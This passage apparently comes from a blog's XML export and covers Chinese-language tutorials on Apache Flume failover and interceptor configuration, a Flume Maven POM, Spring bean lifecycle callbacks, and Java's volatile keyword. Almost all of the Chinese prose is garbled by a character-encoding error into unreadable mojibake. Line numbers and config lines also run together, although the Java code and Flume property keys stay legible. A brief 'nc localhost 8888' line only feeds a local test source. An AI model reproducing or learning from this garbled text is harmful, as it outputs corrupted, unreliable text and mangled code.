å‘æ¶ˆæ¯===================================================================$&gt;nc localhost 8888 4.5 Flume çš„é«˜å¯ç”¨é…ç½® æ˜¯é€šè¿‡é…ç½®ä¼˜å…ˆçº§æ¥å®ç°ä¸»ä», ä¼˜å…ˆçº§æ˜¯ç»„å†…çš„ä¼˜å…ˆçº§, éœ€è¦å…ˆè®¾ç½®ä¸ºä¸€ç»„ ä¼˜å…ˆçº§é«˜çš„ down æ‰äº†, å†å¯åŠ¨èµ·æ¥, ä¾ç„¶æ˜¯ä¸» ==&gt; å·²éªŒè¯ 1234567891011==============================--è®¾ç½®ä¼˜å…ˆçº§ä»£é…ç½®å¦‚ä¸‹----------#set sink group è®¾ç½®ä¸ºä¸€ç»„a1.sinkgroups.g1.sinks = k1 k2#set failover è®¾ç½®å®¹ç¾ç›¸å…³çš„å‚æ•°a1.sinkgroups.g1.processor.type = failover# è®¾ç½® ç»„å†…æˆå‘˜çš„ä¼˜å…ˆçº§, å†³å®š ä¸»å¤‡a1.sinkgroups.g1.processor.priority.k1 = 10 a1.sinkgroups.g1.processor.priority.k2 = 1 a1.sinkgroups.g1.processor.maxpenalty = 10000 ä»¥ä¸‹é…ç½®æ–¹æ¡ˆä¸ä¸Šå›¾ä¸åŒçš„, ç”¨çš„æ˜¯1ä¸ª channel, 2ä¸ª`sink` 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011. é…ç½® agent ==&gt; cs1, cs2================================================================================================[ha_agent.conf]------------------#agent name: a1 a1.channels = c1 a1.sources = r1a1.sinks = k1 k2#set gruopa1.sinkgroups = g1#set channela1.channels.c1.type = memory a1.channels.c1.capacity = 1000 a1.channels.c1.transactionCapacity = 100# set sourcesa1.sources.r1.channels = c1a1.sources.r1.type = execa1.sources.r1.command = tail -F /home/ap/flumedata/testha.log# è¿™é‡Œæœ‰ç–‘é—® : è¿™é‡Œè®¾ç½®æ‹¦æˆªå™¨çš„æ„ä¹‰?? éšä¾¿è®¾ç½®çš„å—?? :TODOa1.sources.r1.interceptors = i1 i2 a1.sources.r1.interceptors.i1.type = static a1.sources.r1.interceptors.i1.key = Type a1.sources.r1.interceptors.i1.value = LOGIN a1.sources.r1.interceptors.i2.type = timestamp# set sink1 -&gt; é€šè¿‡ avro æ²‰åˆ° cs3çš„ source ä¸Ša1.sinks.k1.channel = c1 a1.sinks.k1.type = avro a1.sinks.k1.hostname = cs3 a1.sinks.k1.port = 52020# set sink2 -&gt; é€šè¿‡ avro æ²‰åˆ° cs4çš„ source ä¸Ša1.sinks.k2.channel = c1 a1.sinks.k2.type = avro a1.sinks.k2.hostname = cs4 a1.sinks.k2.port = 52020#set sink group è®¾ç½®ä¸ºä¸€ç»„a1.sinkgroups.g1.sinks = k1 k2#set failover è®¾ç½®å®¹ç¾ç›¸å…³çš„å‚æ•°a1.sinkgroups.g1.processor.type = failover# è®¾ç½® ç»„å†…æˆå‘˜çš„ä¼˜å…ˆçº§, å†³å®š ä¸»å¤‡a1.sinkgroups.g1.processor.priority.k1 = 10 a1.sinkgroups.g1.processor.priority.k2 = 1 a1.sinkgroups.g1.processor.maxpenalty = 100002. é…ç½® collector ==&gt; cs3,cs4================================================================================================[ha_collector.conf]#set agent name a1.sources = r1a1.channels = c1 a1.sinks = k1#set channela1.channels.c1.type = memory a1.channels.c1.capacity = 1000 a1.channels.c1.transactionCapacity = 100# other node,nna to nnsa1.sources.r1.type = avro# :TODO è¿™äº› key, value è®¾ç½®äº†ä¹‹å, ç”¨åœ¨ä»€ä¹ˆåœ°æ–¹???## å½“å‰ä¸»æœºæ˜¯ä»€ä¹ˆï¼Œå°±ä¿®æ”¹æˆä»€ä¹ˆä¸»æœºå a1.sources.r1.bind = cs3 a1.sources.r1.port = 52020 a1.sources.r1.interceptors = i1 a1.sources.r1.interceptors.i1.type = static a1.sources.r1.interceptors.i1.key = Collector## å½“å‰ä¸»æœºæ˜¯ä»€ä¹ˆï¼Œå°±ä¿®æ”¹æˆä»€ä¹ˆä¸»æœºå a1.sources.r1.interceptors.i1.value = cs3 a1.sources.r1.channels = c1#set sink to hdfsa1.sinks.k1.type=hdfsa1.sinks.k1.hdfs.path=/user/ap/flume/event_ha/loghdfs a1.sinks.k1.hdfs.fileType=DataStream a1.sinks.k1.hdfs.writeFormat=TEXT a1.sinks.k1.hdfs.rollInterval=10a1.sinks.k1.channel=c1 a1.sinks.k1.hdfs.filePrefix=%Y-%m-%d3. å¯åŠ¨================================================================================================# å…ˆå¯åŠ¨ cs3,cs4 ==&gt; collector $&gt; [ap@cs4]~/apps/flume/conf/confs% flume-ng agent -f ha_collector.conf -n a1 -Dflume.root.logger=DEBUG,console# å†å¯åŠ¨ cs1, cs2 ==&gt; agent, è¿æ¥ collector[ap@cs1]~/apps/flume/conf/confs% flume-ng agent -f ha_agent.conf -n a1 -Dflume.root.logger=DEBUG,console 4.6 å®ç”¨ä¸šåŠ¡åœºæ™¯çŸ¥è¯†ç‚¹: æ‹¦æˆªå™¨ interceptors 4.6.1 éœ€æ±‚: Aã€B ä¸¤å°æ—¥å¿—æœåŠ¡æœºå™¨å®æ—¶ç”Ÿäº§æ—¥å¿—ä¸»è¦ç±»å‹ä¸º access.logã€nginx.logã€web.log ç°åœ¨è¦æ±‚: æŠŠ Aã€B æœºå™¨ä¸­çš„ access.logã€nginx.logã€web.log é‡‡é›†æ±‡æ€»åˆ° C æœºå™¨ä¸Šç„¶åç»Ÿä¸€æ”¶é›†åˆ° hdfs ä¸­ã€‚ ä½†æ˜¯åœ¨ hdfs ä¸­è¦æ±‚çš„ç›®å½•ä¸º: /source/logs/access/20160101/** /source/logs/nginx/20160101/** /source/logs/web/20160101/** 4.6.2 éœ€æ±‚åˆ†æéœ€æ±‚åˆ†æå›¾ç¤º æ•°æ®å¤„ç†æµç¨‹åˆ†æ åœ¨æ¯ä¸€å°èŠ‚ç‚¹ä¸Šéƒ½è¦ æœé›† 3ä¸ª source æº æœé›†å®Œæˆåå‘å¾€åŒä¸€å°èŠ‚ç‚¹ 4.6.3 éœ€æ±‚å®ç°1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201211221231241251261.åœ¨cs1,cs2ä¸Šé…ç½®flume, é€šè¿‡ avro, sinkåˆ°cs3=============================================================[exec_source_avro_sink.conf]------------------------------# æŒ‡å®šå„ä¸ªæ ¸å¿ƒç»„ä»¶ a1.sources = r1 r2 r3 a1.sinks = k1 a1.channels = c1# å‡†å¤‡æ•°æ®æº# static æ‹¦æˆªå™¨çš„åŠŸèƒ½å°±æ˜¯å¾€é‡‡é›†åˆ°çš„æ•°æ®çš„ header ä¸­æ’å…¥è‡ªå·±å®šä¹‰çš„ key-value å¯¹ # sources-&gt;r1a1.sources.r1.type = execa1.sources.r1.command = tail -F -c +0 /home/ap/flumedata/access.log a1.sources.r1.interceptors = i1a1.sources.r1.interceptors.i1.type = statica1.sources.r1.interceptors.i1.key = typea1.sources.r1.interceptors.i1.value = access# sources-&gt;r2a1.sources.r2.type = execa1.sources.r2.command = tail -F -c +0 /home/ap/flumedata/nginx.log a1.sources.r2.interceptors = i2a1.sources.r2.interceptors.i2.type = static a1.sources.r2.interceptors.i2.key = type a1.sources.r2.interceptors.i2.value = nginx# sources-&gt;r3a1.sources.r3.type = execa1.sources.r3.command = tail -F -c +0 /home/ap/flumedata/web.log a1.sources.r3.interceptors = i3a1.sources.r3.interceptors.i3.type = static a1.sources.r3.interceptors.i3.key = type a1.sources.r3.interceptors.i3.value = web# Describe the sinka1.sinks.k1.type = avro a1.sinks.k1.hostname = cs3 a1.sinks.k1.port = 41414# Use a channel which buffers events in memory a1.channels.c1.type = memory a1.channels.c1.capacity = 20000 a1.channels.c1.transactionCapacity = 10000# Bind the source and sink to the channel a1.sources.r1.channels = c1 a1.sources.r2.channels = c1 a1.sources.r3.channels = c1 a1.sinks.k1.channel = c12. åœ¨ cs3ä¸Šé…ç½® flume, source ä¸º avro, æ¥å—æ¥è‡ª cs1,cs2ä¸‹æ²‰çš„æ•°æ®======================================================================[avro_source_hdfs_sink.conf]-------------------------------#å®šä¹‰ agent åï¼Œ sourceã€channelã€sink çš„åç§° a1.sources = r1a1.sinks = k1a1.channels = c1#å®šä¹‰ source a1.sources.r1.type = avro a1.sources.r1.bind = localhosta1.sources.r1.port =41414#æ·»åŠ æ—¶é—´æ‹¦æˆªå™¨#Note:For all of the time related escape sequences, a header with the key â€œtimestampâ€ must #exist among the headers of the event (unless hdfs.useLocalTimeStamp is set to true). One way #to add this automatically is to use the TimestampInterceptor. a1.sources.r1.interceptors = i1 a1.sources.r1.interceptors.i1.type=org.apache.flume.interceptor.TimestampInterceptor$Builder#å®šä¹‰ channelsa1.channels.c1.type = memory #The maximum number of events stored in the channela1.channels.c1.capacity = 20000 #The maximum number of events the channel will take from a source or give to a sink per transactiona1.channels.c1.transactionCapacity = 10000#å®šä¹‰ sinka1.sinks.k1.type = hdfs a1.sinks.k1.hdfs.path = /user/ap/flume/event/%&#123;type&#125;/%Y%m%d a1.sinks.k1.hdfs.filePrefix = eventsa1.sinks.k1.hdfs.fileType = DataStreama1.sinks.k1.hdfs.writeFormat = Text#æ—¶é—´ç±»å‹a1.sinks.k1.hdfs.useLocalTimeStamp = true #ç”Ÿæˆçš„æ–‡ä»¶ä¸æŒ‰æ¡æ•°ç”Ÿæˆ, å¦åˆ™å°±æ˜¯æŒ‰ç…§è®¾å®šçš„ eventäº§ç”Ÿçš„, 1è¡Œå°±æ˜¯ä¸€ä¸ª event #Number of events written to file before it rolled (0 = never roll based on number of events)a1.sinks.k1.hdfs.rollCount = 0#ç”Ÿæˆçš„æ–‡ä»¶æŒ‰æ—¶é—´ç”Ÿæˆ,å•ä½æ˜¯ç§’#Number of seconds to wait before rolling current file (0 = never roll based on time interval)a1.sinks.k1.hdfs.rollInterval = 30#ç”Ÿæˆçš„æ–‡ä»¶æŒ‰å¤§å°ç”Ÿæˆ, å•ä½æ˜¯ bytes#1 MB = 1,024 KB = 1,048,576 Bytes #File size to trigger roll, in bytes (0: never roll based on file size)a1.sinks.k1.hdfs.rollSize = 10485760 #è¿™é‡Œæ˜¯10MB#æ‰¹é‡å†™å…¥ hdfs çš„ä¸ªæ•°a1.sinks.k1.hdfs.batchSize = 20#flume æ“ä½œ hdfs çš„çº¿ç¨‹æ•°(åŒ…æ‹¬æ–°å»ºï¼Œå†™å…¥ç­‰) a1.sinks.k1.hdfs.threadsPoolSize=10#æ“ä½œ hdfs è¶…æ—¶æ—¶é—´a1.sinks.k1.hdfs.callTimeout=30000#ç»„è£… sourceã€channelã€sink a1.sources.r1.channels = c1 a1.sinks.k1.channel = c13.å¯åŠ¨æœåŠ¡============================================================================# å¯åŠ¨cs3 =&gt; æœåŠ¡å™¨ c[ap@cs3]~/apps/flume/conf/confs% flume-ng agent -f avro_source_hdfs_sink.conf -n a1 -Dflume.root.logger=DEBUG,console# å¯åŠ¨cs1, cs2 =&gt; æœåŠ¡å™¨ a, b# æ³¨æ„: åƒä¸‡åˆ«å¯é”™äº†, å¦åˆ™å¾ˆéš¾æ‰¾åˆ°åŸå› ..[ap@cs2]~/apps/flume/conf/confs% flume-ng agent -f exec_source_avro_sink.conf -n a1 -Dflume.root.logger=DEBUG,console==============é‡åˆ°é—®é¢˜: è¿™ç§é€šè¿‡avroå¤šç‚¹ sink åˆ°ä¸€ä¸ª source çš„æ—¶å€™, å®ç°ä¸åˆ›å»ºæ–‡ä»¶å¤¹/æ–‡ä»¶çš„, å¥½åƒç¡®å®å†™å…¥ä¸è¿›å»...===&gt; md, åŸå› åº”è¯¥æ˜¯å¯åŠ¨é”™é…ç½®äº† 5.Flumeçš„Mavenä¾èµ–123456789101112131415161718192021222324252627282930313233&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;com.rox&lt;/groupId&gt; &lt;artifactId&gt;Flume_test&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.flume&lt;/groupId&gt; &lt;artifactId&gt;flume-ng-core&lt;/artifactId&gt; &lt;version&gt;1.6.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.flume.flume-ng-sinks&lt;/groupId&gt; &lt;artifactId&gt;flume-hdfs-sink&lt;/artifactId&gt; &lt;version&gt;1.6.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.flume.flume-ng-sinks&lt;/groupId&gt; &lt;artifactId&gt;flume-ng-hbase-sink&lt;/artifactId&gt; &lt;version&gt;1.6.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.flume.flume-ng-channels&lt;/groupId&gt; &lt;artifactId&gt;flume-file-channel&lt;/artifactId&gt; &lt;version&gt;1.6.0&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/project&gt;]]></content>
      <categories>
        <category>Hadoop</category>
        <category>Flume</category>
      </categories>
      <tags>
        <tag>åŸåˆ›</tag>
        <tag>æŠ€æœ¯</tag>
        <tag>Hadoop</tag>
        <tag>Flume</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[spring-bean-lifecycle]]></title>
    <url>%2F2018%2F06%2F30%2FJava%2FInterview%2FJava-Interview%2Fspring%2Fspring-bean-lifecycle%2F</url>
    <content type="text"><![CDATA[Spring Bean ç”Ÿå‘½å‘¨æœŸå‰è¨€Spring Bean çš„ç”Ÿå‘½å‘¨æœŸåœ¨æ•´ä¸ª Spring ä¸­å æœ‰å¾ˆé‡è¦çš„ä½ç½®ï¼ŒæŒæ¡è¿™äº›å¯ä»¥åŠ æ·±å¯¹ Spring çš„ç†è§£ã€‚ é¦–å…ˆçœ‹ä¸‹ç”Ÿå‘½å‘¨æœŸå›¾ï¼š å†è°ˆç”Ÿå‘½å‘¨æœŸä¹‹å‰æœ‰ä¸€ç‚¹éœ€è¦å…ˆæ˜ç¡®ï¼š Spring åªå¸®æˆ‘ä»¬ç®¡ç†å•ä¾‹æ¨¡å¼ Bean çš„å®Œæ•´ç”Ÿå‘½å‘¨æœŸï¼Œå¯¹äº prototype çš„ bean ï¼ŒSpring åœ¨åˆ›å»ºå¥½äº¤ç»™ä½¿ç”¨è€…ä¹‹ååˆ™ä¸ä¼šå†ç®¡ç†åç»­çš„ç”Ÿå‘½å‘¨æœŸã€‚ æ³¨è§£æ–¹å¼åœ¨ bean åˆå§‹åŒ–æ—¶ä¼šç»å†å‡ ä¸ªé˜¶æ®µï¼Œé¦–å…ˆå¯ä»¥ä½¿ç”¨æ³¨è§£ @PostConstruct, @PreDestroy æ¥åœ¨ bean çš„åˆ›å»ºå’Œé”€æ¯é˜¶æ®µè¿›è¡Œè°ƒç”¨: 1234567891011121314@Componentpublic class AnnotationBean &#123; private final static Logger LOGGER = LoggerFactory.getLogger(AnnotationBean.class); @PostConstruct public void start()&#123; LOGGER.info("AnnotationBean start"); &#125; @PreDestroy public void destroy()&#123; LOGGER.info("AnnotationBean destroy"); &#125;&#125; InitializingBean, DisposableBean æ¥å£è¿˜å¯ä»¥å®ç° InitializingBean,DisposableBean è¿™ä¸¤ä¸ªæ¥å£ï¼Œä¹Ÿæ˜¯åœ¨åˆå§‹åŒ–ä»¥åŠé”€æ¯é˜¶æ®µè°ƒç”¨ï¼š 12345678910111213@Servicepublic class SpringLifeCycleService implements InitializingBean,DisposableBean&#123; private final static Logger LOGGER = LoggerFactory.getLogger(SpringLifeCycleService.class); @Override public void afterPropertiesSet() throws Exception &#123; LOGGER.info("SpringLifeCycleService start"); &#125; @Override public void destroy() throws Exception &#123; LOGGER.info("SpringLifeCycleService destroy"); &#125;&#125; è‡ªå®šä¹‰åˆå§‹åŒ–å’Œé”€æ¯æ–¹æ³•ä¹Ÿå¯ä»¥è‡ªå®šä¹‰æ–¹æ³•ç”¨äºåœ¨åˆå§‹åŒ–ã€é”€æ¯é˜¶æ®µè°ƒç”¨: 123456789101112131415161718192021222324@Configurationpublic class LifeCycleConfig &#123; @Bean(initMethod = "start", destroyMethod = "destroy") public SpringLifeCycle create()&#123; SpringLifeCycle springLifeCycle = new SpringLifeCycle() ; return springLifeCycle ; &#125;&#125;public class SpringLifeCycle&#123; private final static Logger LOGGER = LoggerFactory.getLogger(SpringLifeCycle.class); public void start()&#123; LOGGER.info("SpringLifeCycle start"); &#125; public void destroy()&#123; LOGGER.info("SpringLifeCycle destroy"); &#125;&#125; ä»¥ä¸Šæ˜¯åœ¨ SpringBoot ä¸­å¯ä»¥è¿™æ ·é…ç½®ï¼Œå¦‚æœæ˜¯åŸå§‹çš„åŸºäº XML ä¹Ÿæ˜¯å¯ä»¥ä½¿ç”¨: 12&lt;bean class="com.crossoverjie.spring.SpringLifeCycle" init-method="start" destroy-method="destroy"&gt;&lt;/bean&gt; æ¥è¾¾åˆ°åŒæ ·çš„æ•ˆæœã€‚ å®ç° *Aware æ¥å£*Aware æ¥å£å¯ä»¥ç”¨äºåœ¨åˆå§‹åŒ– bean æ—¶è·å¾— Spring ä¸­çš„ä¸€äº›å¯¹è±¡ï¼Œå¦‚è·å– Spring ä¸Šä¸‹æ–‡ç­‰ã€‚ 123456789101112@Componentpublic class SpringLifeCycleAware implements ApplicationContextAware &#123; private final static Logger LOGGER = LoggerFactory.getLogger(SpringLifeCycleAware.class); private ApplicationContext applicationContext ; @Override public void setApplicationContext(ApplicationContext applicationContext) throws BeansException &#123; this.applicationContext = applicationContext ; LOGGER.info("SpringLifeCycleAware start"); &#125;&#125; è¿™æ ·åœ¨ springLifeCycleAware è¿™ä¸ª bean åˆå§‹åŒ–ä¼šå°±ä¼šè°ƒç”¨ setApplicationContext æ–¹æ³•ï¼Œå¹¶å¯ä»¥è·å¾— applicationContext å¯¹è±¡ã€‚ BeanPostProcessor å¢å¼ºå¤„ç†å™¨å®ç° BeanPostProcessor æ¥å£ï¼ŒSpring ä¸­æ‰€æœ‰ bean åœ¨åšåˆå§‹åŒ–æ—¶éƒ½ä¼šè°ƒç”¨è¯¥æ¥å£ä¸­çš„ä¸¤ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨äºå¯¹ä¸€äº›ç‰¹æ®Šçš„ bean è¿›è¡Œå¤„ç†ï¼š 12345678910111213141516171819202122232425262728293031323334@Componentpublic class SpringLifeCycleProcessor implements BeanPostProcessor &#123; private final static Logger LOGGER = LoggerFactory.getLogger(SpringLifeCycleProcessor.class); /** * é¢„åˆå§‹åŒ– åˆå§‹åŒ–ä¹‹å‰è°ƒç”¨ * @param bean * @param beanName * @return * @throws BeansException */ @Override public Object postProcessBeforeInitialization(Object bean, String beanName) throws BeansException &#123; if ("annotationBean".equals(beanName))&#123; LOGGER.info("SpringLifeCycleProcessor start beanName=&#123;&#125;",beanName); &#125; return bean; &#125; /** * ååˆå§‹åŒ– bean åˆå§‹åŒ–å®Œæˆè°ƒç”¨ * @param bean * @param beanName * @return * @throws BeansException */ @Override public Object postProcessAfterInitialization(Object bean, String beanName) throws BeansException &#123; if ("annotationBean".equals(beanName))&#123; LOGGER.info("SpringLifeCycleProcessor end beanName=&#123;&#125;",beanName); &#125; return bean; &#125;&#125; æ‰§è¡Œä¹‹åè§‚å¯Ÿç»“æœï¼š 123456789101112131415018-03-21 00:40:24.856 [restartedMain] INFO c.c.s.p.SpringLifeCycleProcessor - SpringLifeCycleProcessor start beanName=annotationBean2018-03-21 00:40:24.860 [restartedMain] INFO c.c.spring.annotation.AnnotationBean - AnnotationBean start2018-03-21 00:40:24.861 [restartedMain] INFO c.c.s.p.SpringLifeCycleProcessor - SpringLifeCycleProcessor end beanName=annotationBean2018-03-21 00:40:24.864 [restartedMain] INFO c.c.s.aware.SpringLifeCycleAware - SpringLifeCycleAware start2018-03-21 00:40:24.867 [restartedMain] INFO c.c.s.service.SpringLifeCycleService - SpringLifeCycleService start2018-03-21 00:40:24.887 [restartedMain] INFO c.c.spring.SpringLifeCycle - SpringLifeCycle start2018-03-21 00:40:25.062 [restartedMain] INFO o.s.b.d.a.OptionalLiveReloadServer - LiveReload server is running on port 357292018-03-21 00:40:25.122 [restartedMain] INFO o.s.j.e.a.AnnotationMBeanExporter - Registering beans for JMX exposure on startup2018-03-21 00:40:25.140 [restartedMain] INFO com.crossoverjie.Application - Started Application in 2.309 seconds (JVM running for 3.681)2018-03-21 00:40:25.143 [restartedMain] INFO com.crossoverjie.Application - start ok!2018-03-21 00:40:25.153 [Thread-8] INFO o.s.c.a.AnnotationConfigApplicationContext - Closing org.springframework.context.annotation.AnnotationConfigApplicationContext@3913adad: startup date [Wed Mar 21 00:40:23 CST 2018]; root of context hierarchy2018-03-21 00:40:25.155 [Thread-8] INFO o.s.j.e.a.AnnotationMBeanExporter - Unregistering JMX-exposed beans on shutdown2018-03-21 00:40:25.156 [Thread-8] INFO c.c.spring.SpringLifeCycle - SpringLifeCycle destroy2018-03-21 00:40:25.156 [Thread-8] INFO c.c.s.service.SpringLifeCycleService - SpringLifeCycleService destroy2018-03-21 00:40:25.156 [Thread-8] INFO c.c.spring.annotation.AnnotationBean - AnnotationBean destroy ç›´åˆ° Spring ä¸Šä¸‹æ–‡é”€æ¯æ—¶åˆ™ä¼šè°ƒç”¨è‡ªå®šä¹‰çš„é”€æ¯æ–¹æ³•ä»¥åŠå®ç°äº† DisposableBean çš„ destroy() æ–¹æ³•ã€‚]]></content>
      <categories>
        <category>Github</category>
        <category>Java-Interview</category>
      </categories>
      <tags>
        <tag>æŠ€æœ¯</tag>
        <tag>Java</tag>
        <tag>è½¬è½½</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[volatile]]></title>
    <url>%2F2018%2F06%2F30%2FJava%2FInterview%2FJava-Interview%2Fconcurrent%2Fvolatile%2F</url>
    <content type="text"><![CDATA[ä½ åº”è¯¥çŸ¥é“çš„ volatile å…³é”®å­—å‰è¨€ä¸ç®¡æ˜¯åœ¨é¢è¯•è¿˜æ˜¯å®é™…å¼€å‘ä¸­ volatile éƒ½æ˜¯ä¸€ä¸ªåº”è¯¥æŒæ¡çš„æŠ€èƒ½ã€‚ é¦–å…ˆæ¥çœ‹çœ‹ä¸ºä»€ä¹ˆä¼šå‡ºç°è¿™ä¸ªå…³é”®å­—ã€‚ å†…å­˜å¯è§æ€§ç”±äº Java å†…å­˜æ¨¡å‹(JMM)è§„å®šï¼Œæ‰€æœ‰çš„å˜é‡éƒ½å­˜æ”¾åœ¨ä¸»å†…å­˜ä¸­ï¼Œè€Œæ¯ä¸ªçº¿ç¨‹éƒ½æœ‰ç€è‡ªå·±çš„å·¥ä½œå†…å­˜(é«˜é€Ÿç¼“å­˜)ã€‚ çº¿ç¨‹åœ¨å·¥ä½œæ—¶ï¼Œéœ€è¦å°†ä¸»å†…å­˜ä¸­çš„æ•°æ®æ‹·è´åˆ°å·¥ä½œå†…å­˜ä¸­ã€‚è¿™æ ·å¯¹æ•°æ®çš„ä»»ä½•æ“ä½œéƒ½æ˜¯åŸºäºå·¥ä½œå†…å­˜(æ•ˆç‡æé«˜)ï¼Œå¹¶ä¸”ä¸èƒ½ç›´æ¥æ“ä½œä¸»å†…å­˜ä»¥åŠå…¶ä»–çº¿ç¨‹å·¥ä½œå†…å­˜ä¸­çš„æ•°æ®ï¼Œä¹‹åå†å°†æ›´æ–°ä¹‹åçš„æ•°æ®åˆ·æ–°åˆ°ä¸»å†…å­˜ä¸­ã€‚ è¿™é‡Œæ‰€æåˆ°çš„ä¸»å†…å­˜å¯ä»¥ç®€å•è®¤ä¸ºæ˜¯å †å†…å­˜ï¼Œè€Œå·¥ä½œå†…å­˜åˆ™å¯ä»¥è®¤ä¸ºæ˜¯æ ˆå†…å­˜ã€‚ å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š æ‰€ä»¥åœ¨å¹¶å‘è¿è¡Œæ—¶å¯èƒ½ä¼šå‡ºç°çº¿ç¨‹ B æ‰€è¯»å–åˆ°çš„æ•°æ®æ˜¯çº¿ç¨‹ A æ›´æ–°ä¹‹å‰çš„æ•°æ®ã€‚ æ˜¾ç„¶è¿™è‚¯å®šæ˜¯ä¼šå‡ºé—®é¢˜çš„ï¼Œå› æ­¤ volatile çš„ä½œç”¨å‡ºç°äº†ï¼š å½“ä¸€ä¸ªå˜é‡è¢« volatile ä¿®é¥°æ—¶ï¼Œä»»ä½•çº¿ç¨‹å¯¹å®ƒçš„å†™æ“ä½œéƒ½ä¼šç«‹å³åˆ·æ–°åˆ°ä¸»å†…å­˜ä¸­ï¼Œå¹¶ä¸”ä¼šå¼ºåˆ¶è®©ç¼“å­˜äº†è¯¥å˜é‡çš„çº¿ç¨‹ä¸­çš„æ•°æ®æ¸…ç©ºï¼Œå¿…é¡»ä»ä¸»å†…å­˜é‡æ–°è¯»å–æœ€æ–°æ•°æ®ã€‚ volatile ä¿®é¥°ä¹‹åå¹¶ä¸æ˜¯è®©çº¿ç¨‹ç›´æ¥ä»ä¸»å†…å­˜ä¸­è·å–æ•°æ®ï¼Œä¾ç„¶éœ€è¦å°†å˜é‡æ‹·è´åˆ°å·¥ä½œå†…å­˜ä¸­ã€‚ å†…å­˜å¯è§æ€§çš„åº”ç”¨å½“æˆ‘ä»¬éœ€è¦åœ¨ä¸¤ä¸ªçº¿ç¨‹é—´ä¾æ®ä¸»å†…å­˜é€šä¿¡æ—¶ï¼Œé€šä¿¡çš„é‚£ä¸ªå˜é‡å°±å¿…é¡»çš„ç”¨ volatile æ¥ä¿®é¥°ï¼š 1234567891011121314151617181920212223242526272829public class Volatile implements Runnable&#123; private static volatile boolean flag = true ; @Override public void run() &#123; while (flag)&#123; System.out.println(Thread.currentThread().getName() + "æ­£åœ¨è¿è¡Œã€‚ã€‚ã€‚"); &#125; System.out.println(Thread.currentThread().getName() +"æ‰§è¡Œå®Œæ¯•"); &#125; public static void main(String[] args) throws InterruptedException &#123; Volatile aVolatile = new Volatile(); new Thread(aVolatile,"thread A").start(); System.out.println("main çº¿ç¨‹æ­£åœ¨è¿è¡Œ") ; TimeUnit.MILLISECONDS.sleep(100) ; aVolatile.stopThread(); &#125; private void stopThread()&#123; flag = false ; &#125;&#125; ä¸»çº¿ç¨‹åœ¨ä¿®æ”¹äº†æ ‡å¿—ä½ä½¿å¾—çº¿ç¨‹ A ç«‹å³åœæ­¢ï¼Œå¦‚æœæ²¡æœ‰ç”¨ volatile ä¿®é¥°ï¼Œå°±æœ‰å¯èƒ½å‡ºç°å»¶è¿Ÿã€‚ ä½†è¿™é‡Œæœ‰ä¸ªè¯¯åŒºï¼Œè¿™æ ·çš„ä½¿ç”¨æ–¹å¼å®¹æ˜“ç»™äººçš„æ„Ÿè§‰æ˜¯ï¼š å¯¹ volatile ä¿®é¥°çš„å˜é‡è¿›è¡Œå¹¶å‘æ“ä½œæ˜¯çº¿ç¨‹å®‰å…¨çš„ã€‚ è¿™é‡Œè¦é‡ç‚¹å¼ºè°ƒï¼Œvolatile å¹¶ä¸èƒ½ä¿è¯çº¿ç¨‹å®‰å…¨æ€§ï¼ å¦‚ä¸‹ç¨‹åº: 1234567891011121314151617181920212223242526272829303132public class VolatileInc implements Runnable&#123; private static volatile int count = 0 ; //ä½¿ç”¨ volatile ä¿®é¥°åŸºæœ¬æ•°æ®å†…å­˜ä¸èƒ½ä¿è¯åŸå­æ€§ //private static AtomicInteger count = new AtomicInteger() ; @Override public void run() &#123; for (int i=0;i&lt;10000 ;i++)&#123; count ++ ; //count.incrementAndGet() ; &#125; &#125; public static void main(String[] args) throws InterruptedException &#123; VolatileInc volatileInc = new VolatileInc() ; Thread t1 = new Thread(volatileInc,"t1") ; Thread t2 = new Thread(volatileInc,"t2") ; t1.start(); //t1.join(); t2.start(); //t2.join(); for (int i=0;i&lt;10000 ;i++)&#123; count ++ ; //count.incrementAndGet(); &#125; System.out.println("æœ€ç»ˆCount="+count); &#125;&#125; å½“æˆ‘ä»¬ä¸‰ä¸ªçº¿ç¨‹(t1,t2,main)åŒæ—¶å¯¹ä¸€ä¸ª int è¿›è¡Œç´¯åŠ æ—¶ä¼šå‘ç°æœ€ç»ˆçš„å€¼éƒ½ä¼šå°äº 30000ã€‚ è¿™æ˜¯å› ä¸ºè™½ç„¶ volatile ä¿è¯äº†å†…å­˜å¯è§æ€§ï¼Œæ¯ä¸ªçº¿ç¨‹æ‹¿åˆ°çš„å€¼éƒ½æ˜¯æœ€æ–°å€¼ï¼Œä½† count ++ è¿™ä¸ªæ“ä½œå¹¶ä¸æ˜¯åŸå­çš„ï¼Œè¿™é‡Œé¢æ¶‰åŠåˆ°è·å–å€¼ã€è‡ªå¢ã€èµ‹å€¼çš„æ“ä½œå¹¶ä¸èƒ½åŒæ—¶å®Œæˆã€‚ æ‰€ä»¥æƒ³åˆ°è¾¾åˆ°çº¿ç¨‹å®‰å…¨å¯ä»¥ä½¿è¿™ä¸‰ä¸ªçº¿ç¨‹ä¸²è¡Œæ‰§è¡Œ(å…¶å®å°±æ˜¯å•çº¿ç¨‹ï¼Œæ²¡æœ‰å‘æŒ¥å¤šçº¿ç¨‹çš„ä¼˜åŠ¿)ã€‚ ä¹Ÿå¯ä»¥ä½¿ç”¨ synchronize 